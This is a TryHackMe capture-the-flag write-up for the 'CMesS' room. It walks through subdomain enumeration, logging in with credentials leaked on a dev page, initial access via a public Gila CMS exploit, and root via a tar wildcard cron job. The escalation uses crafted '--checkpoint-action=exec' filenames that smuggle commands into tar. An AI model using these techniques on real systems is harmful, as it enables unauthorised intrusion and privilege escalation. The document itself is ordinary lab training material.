# 39 - CMesS (subdomain enum) (tar \* exploitation)

Room Link --> [https://tryhackme.com/room/cmess](https://tryhackme.com/room/cmess)

### Enumeration

Please add `10.10.86.16 cmess.thm` to /etc/hosts

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv   -sV -p- -T5

# outputs
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```
{% endcode %}

#### Gobuster enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://cmess.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 500,403,404

# output
/login
/sites
/index
/about
/themes
/INDEX
/1px
/lib
```
{% endcode %}

#### Sub-domain enumeration with wfuzz

{% code overflow="wrap" lineNumbers="true" %}
```bash
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -t 42 --hl 107

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                        
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"
```
{% endcode %}

Add the `dev.cmess.thm` to /etc/hosts.

{% code overflow="wrap" %}
```
Development Log
andre@cmess.thm
Have you guys fixed the bug that was found on live?

support@cmess.thm
Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!

support@cmess.thm
Update! We have had to delay the patch due to unforeseen circumstances

andre@cmess.thm
That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.

support@cmess.thm
Your password has been reset. Here: KPFTN_f2yxe%
```
{% endcode %}

And we can try to login with creds: `andre@cmess.thm : KPFTN_f2yxe%` .

Searching Google for "Gila Cms exploit" and stumbled on [this](https://www.exploit-db.com/exploits/51569)

### Initial Access

Ready nc listener beore runnin the code.

<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Another way to get shell

{% embed url="https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/cmess" %}

###

`cat /etc/crontab` .

<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see a cron job owned by root, utilizing the `tar *`  - wildcards. So we can exploit this.

But we have to be in "andre" home dir for this to work, then i realized we have to get access to user andre 1st.

Then i uploaded `linPEAS` into the machine and saw a file in the /opt dir.

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
www-data@cmess:/opt$ cat .password.bak
cat .password.bak
andres backup password
UQfsdCB7aAP6
```
{% endcode %}

We can ssh in as andres and exploit the  `tar *` vuln.

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

exploiting `tar *` or `tar wildcards` .

<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Alternatively:

```
echo -e '#!/bin/bash\n/bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

# just wait 2 minutes for the job to run.
```

<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>



Done.
